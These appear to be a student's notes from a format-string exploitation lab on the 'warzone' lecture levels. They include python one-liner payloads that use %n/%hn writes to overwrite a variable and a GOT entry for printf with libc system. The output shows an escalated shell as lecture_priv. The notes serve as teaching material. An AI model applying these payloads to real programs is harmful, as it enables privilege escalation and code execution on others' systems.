fmt_lec2:
python -c 'print "\xf4\xf5\xff\xbf"+"%x,"*4+"%x%n"' | ./fmt_lec02 
����64,b7fbec20,bffff704,bffff6a4,cafebabe
unchangeable @ 0xbffff5f4
Cookie overwritten!
unchangeable changed to 0x2a
#include<stdio.h>

int main(int argc, char* argv[]){
        unsigned int len1 = 0;
        unsigned int len2 = 0;
        char* name1 = argv[1];
        char* name2 = argv[2];
        printf("%s%n  %s%n\n",name1,&len1,name2,&len2);
        printf("len1=%d len2=%d\n",len1,len2);
        return 0;
}
root@kali:~/exploits/lab4# ./test kaines micheal
kainesmicheal
len1=6 len2=13
root@kali:~/exploits/lab4# vi test.c 
root@kali:~/exploits/lab4# gcc test.c -o test
root@kali:~/exploits/lab4# vi test.c 
root@kali:~/exploits/lab4# gcc test.c -o test
root@kali:~/exploits/lab4# ./test kaines micheal
kaines micheal
len1=6 len2=14
root@kali:~/exploits/lab4# ./test 123 456
123 456
len1=3 len2=7
root@kali:~/exploits/lab4# vi test.c 
root@kali:~/exploits/lab4# gcc test.c -o test
root@kali:~/exploits/lab4# ./test 123 456
123  456
len1=3 len2=8

unchangeable @ 0xbffff5f4
Cookie overwritten!
unchangeable changed to 0xcafebeef
lecture@warzone:/levels/lecture/format_strings$ python -c 'print "\xf4\xf5\xff\xbfJUNK\xf5\xf5\xff\xbf"+"%08x,"*4+"%48831x%hn%"' | ./fmt_lec02 

%n writes 4 bytes
%hn wites 2 bytes
python -c 'print "\xf4\xf5\xff\xbf" + "%x,"*4 +"%48845x%hn"' | ./fmt_lec02

fmt_lec3
python -c 'print "\xf4\xf5\xff\xbfJUNK\xf6\xf5\xff\xbf" + "%08x,"*4 + "%47758x%hn%4160x%hn"' | ./fmt_lec03 
success!
formula: wanted - current + 8
junk is to place the address in correct position coz we need %x%n%x%n
to write two bye at a time %hn is used
we take the address f4 and f6
initial address 38
0xbabe - 0x38 + 8
we get %47758x%n
unchangeable is 0xbac6babe
0xcafe - 0xbac6 + 8
we get %4160x%n
unchangeable is 0xcafebabe

fmt_lec4

its turn out format string is just we are using %n to write whatever byte we need need
so if we need 0xb7e51310.... that is to say we have to write the the decimal equivlent of the hex address.... so we begin with 4872(0x1310) in lower address and we need 0xb7e5 in higher address so we find the decimal equivalent of 0x1b7e5 
that is 112613 - 4872.... we add 1b7e5 because we are wrting two bytes at a time using %hn thus the 1 will get ommited and b7e5 will be added to the higger address and 1310 will  be added to lower address, when the real funtion gets to the location ..it reads it as 0xb7e51310

python -c 'print "\x0c\xa0\x04\x08\x0e\xa0\x04\x08" + "%4872x%6$hn%107733x%7$hn"') | ./fmt_lec04

change the addresss for printf to system funtion

0x0804a00c R_386_JUMP_SLOT   printf
0xb7e51310 <__libc_system> 

no pass
whoami; id
lecture_priv
uid=1042(lecture) gid=1043(lecture) euid=1043(lecture_priv) groups=1044(lecture_priv),1002(gameuser),1043(lecture)

